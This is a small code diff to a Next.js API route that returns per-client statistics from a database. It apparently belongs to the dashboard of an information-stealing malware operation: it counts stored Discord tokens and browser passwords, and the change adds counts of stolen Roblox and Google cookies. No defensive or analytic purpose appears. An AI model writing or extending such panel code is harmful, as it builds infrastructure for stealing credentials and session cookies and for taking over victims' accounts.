@@ -71,10 +71,12 @@ export async function GET() {
     const totalClients = sorted.length
     const discordTokens = allData.filter((d: any) => d.type === "discord_token").length
     const browserPasswords = allData.filter((d: any) => d.type === "browser_passwords").length
+    const robloxCookies = allData.filter((d: any) => d.type === "roblox_cookies").length
+    const googleCookies = allData.filter((d: any) => d.type === "google_cookies").length
 
     return NextResponse.json({
       clients: sorted,
-      stats: { totalData, totalClients, discordTokens, browserPasswords },
+      stats: { totalData, totalClients, discordTokens, browserPasswords, robloxCookies, googleCookies },
     })
   } catch (error) {
     console.error("[DATABASE_GET]", error)
